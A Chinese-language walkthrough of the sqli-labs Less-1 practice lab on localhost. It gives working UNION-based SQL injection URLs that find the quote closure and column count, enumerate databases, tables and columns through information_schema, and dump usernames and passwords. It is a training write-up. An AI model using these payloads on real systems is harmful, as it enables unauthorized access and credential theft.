Less-1

题目：

解题：

单引号闭合

Sql 语句为SELECT * FROM users WHERE id=’$id’ LIMIT 0,1;

找到注入点，发现报错回显

提示传入id的参数，后面跟个单引号http://localhost/sqli-labs-master/Less-1/?id=1’，发现报错，这里看到是已经闭合了。从报错内容中可以看出id传入的是str类型，可以分解成这样来看传递了一个1’的参数，并且1’的参数用单引号包裹，最后再最外层一层单引号' ‘ 1’ ‘ LIMIT 0,1 ‘。然后再进行order by 来排序确定字段数。

此时sql语句为SELECT * FROM users WHERE id=’1’–+’ LIMIT 0,1（简记–+注释掉了多余的‘）

判断字段数

在后面加–+注释掉后面的部分。（简记：输入的id=1’…–+，注释符–+将多余的单引号注释掉。）

利用order by判断字段数，发现字段数为3。（3正常返回，4显示错误）

注：常见的注释符：%23（#）、-–+、；%00、`、……

有时候#或–+或%00不一定可以使用，因为它本身可能有过滤，但过滤看不到，所以需要尝试哪个可以用

爆库、爆表、爆列

爆当前数据库的集合shema：

Http://localhost/sqli-labs-master/Less-1/?id=-1' union select 1,group_concat(schema_name),3 from information_schema.schemata –+

爆security库的表名：
http://localhost/sqli-labs-master/Less-1/?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema = ‘security’ –+

爆users表的列字段：

http://localhost/sqli-labs-master/Less-1/?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name = ‘users’ –+

爆数据（查询username 和password的值）：

http://localhost/sqli-labs-master/Less-1/?id=-1' union select 1,group_concat(username),group_concat(password) from users –+

注：group_concat这个函数可以将多个字符串连接成一个字符串即将结果一行输出

TABLE表：提供了关于数据库中的表的信息（包括视图）

COLUMNS表：提供了表中的列信息即字段数

SCHEMATA表:储存mysql所有数据库的基本信息，包括数据库名，编码类型路径等，show databases的结果取之此表。

table_schema=database()只会搜索当前数据库

group_concat()函数将结果集整合成一句话输出，其间用逗号隔开

爆破库名：

  • union select 1,2,database()

爆表名：

  • union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()
  • union select 1,2, group_concat(table_name) from information_schema.columns where table_schema=database()

爆Column名：

  • union select 1,2, group_concat(column_name) from information_schema.columns where table_schema=database()

总结

判断出闭合形式及字段数

SQL语句的闭合形式大概有以下几种：

SELECT * FROM `users` WHERE id= 1;#整形闭合
SELECT * FROM `users` WHERE id='1';#单引号闭合
SELECT * FROM `users` WHERE id="1";#双引号闭合
SELECT * FROM `users` WHERE id=('1');#单引号加括号
SELECT * FROM `users` WHERE id=("1");#双引号加括号
'))
"))

注：在没有遇到正确的闭合形式前的注入都会把符号（包括注释符）当做一个整体！
